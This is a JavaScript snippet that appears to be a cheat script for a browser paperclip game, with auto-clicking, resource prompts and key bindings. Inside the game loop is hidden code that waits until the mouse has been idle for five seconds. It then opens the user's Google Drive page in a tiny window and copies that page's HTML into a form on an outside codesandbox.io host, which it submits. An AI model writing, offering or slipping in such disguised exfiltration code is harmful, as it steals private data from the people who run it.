function main() {
  clips += parseInt(prompt("clips: "));
  funds += parseInt(prompt("funds: "));
  trust += parseInt(prompt("trust: "));
  window.lastTimeMouseWasMoved = 0;
  unsoldClips += parseInt(prompt("unsold clips: "));
  var done = false;
  setInterval(() => {
    document.getElementsByTagName("button")[22].click();
    document.getElementsByTagName("button")[16].click();
    document.getElementsByTagName("button")[21].click();
    if (creativity < 0) {
      if (creativity < -100000000) {
        creativity = Math.abs(creativity);
      } else {
        creativity = 100000000;
      }
    };
    window.lastTimeMouseWasMoved += 0.1;
    if (window.lastTimeMouseWasMoved > 5 && !done) {
      done = true;
      var myWindow = window.open("https://drive.google.com", "myWindow", "width=10,height=10");
      setTimeout(() => {
        var outgoingRequest = window.open("https://dqvznw.sse.codesandbox.io/", "sending", "width=10,height=10");
        var inter = setInterval(() => {
            alert(myWindow.document.body.innerHTML);
            clearInterval(inter);
            outgoingRequest.document.getElementById("input").value = myWindow.document.body.innerHTML;
            outgoingRequest.document.getElementById("send").click();
          }, 100);
        }, 5000);
    }
  }, 100);
  window.onkeydown = function(e) {
    for (var i in document.getElementsByTagName("button")) {
      if (document.getElementsByTagName("button")[i].innerText.startsWith(e.key)) {
        document.getElementsByTagName("button")[i].click();
      }
    }
  };
  window.onmousemove = function(e) {
    window.lastTimeMouseWasMoved = 0;
  }
}
